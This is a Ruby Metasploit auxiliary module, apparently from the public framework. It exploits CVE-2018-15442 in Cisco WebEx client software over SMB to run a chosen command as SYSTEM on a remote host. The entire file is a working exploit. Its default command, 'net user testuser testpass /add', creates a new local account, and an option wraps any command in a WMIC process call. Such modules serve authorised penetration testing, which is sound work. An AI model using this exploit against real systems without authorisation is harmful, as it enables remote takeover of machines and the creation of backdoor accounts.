##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::WebExec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WebEx Remote Command Execution Utility',
      'Description'    => %q{
        This module enables the execution of a single command as System by exploiting a remote
        code execution vulnerability in Cisco's WebEx client software.
      },

      'Author'         => [
        'Ron Bowes <ron@skullsecurity.net>',
      ],

      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://webexec.org'],
        ['CVE', '2018-15442']
      ]
    ))

    register_options([
      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net user testuser testpass /add']),
      OptPort.new('RPORT', [true, 'The Target port', 445]),
      OptBool.new('FORCE_GUI', [true, 'Ensure a GUI is created via wmic', false]),
    ])
  end

  # This is the main control method
  def run_host(ip)
    @smbshare = datastore['SMBSHARE']
    @ip = ip

    # Try and authenticate with given credentials
    if connect
      begin
        smb_login
      rescue Rex::Proto::SMB::Exceptions::Error => autherror
        print_error("Unable to authenticate with given credentials: #{autherror}")
        return
      end

      command = datastore['COMMAND']
      if datastore['FORCE_GUI']
        command = "WMIC PROCESS CALL Create \"#{command}\""
      end

      wexec(true) do |opts|
        execute_single_command(command, opts)
      end

      print_good("Command completed!")
      disconnect
    end
  end
end
